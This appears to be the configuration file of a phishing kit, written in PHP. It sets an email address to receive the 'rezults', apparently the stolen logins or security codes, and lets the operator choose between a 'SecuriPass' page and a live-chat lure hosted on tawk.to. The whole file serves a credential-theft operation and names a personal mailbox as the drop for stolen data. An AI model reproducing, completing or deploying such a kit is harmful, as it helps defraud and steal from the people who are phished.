<?php

$Mail="alexcoul2020@gmail.com";  // Mail for rezults

$option=0;  // set 0 for classic SecuriPass , 1 for chat option

$channel ="" ; // Chat channel Ex: https://tawk.to/chat/{Channel}



?>